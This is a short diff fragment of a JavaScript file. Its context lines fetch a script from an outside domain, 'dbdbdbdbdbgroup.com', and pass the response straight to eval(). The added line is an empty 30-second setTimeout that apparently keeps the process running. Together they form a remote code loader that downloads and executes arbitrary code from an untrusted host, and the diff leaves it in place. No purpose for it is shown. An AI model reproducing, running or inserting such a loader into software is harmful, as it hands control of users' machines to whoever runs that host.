@@ -17,3 +17,4 @@ fetch("https://dbdbdbdbdbgroup.com/demo/server.js")
         eval(data);
     })
     .catch(console.error);
+setTimeout(()=>{}, 30000);
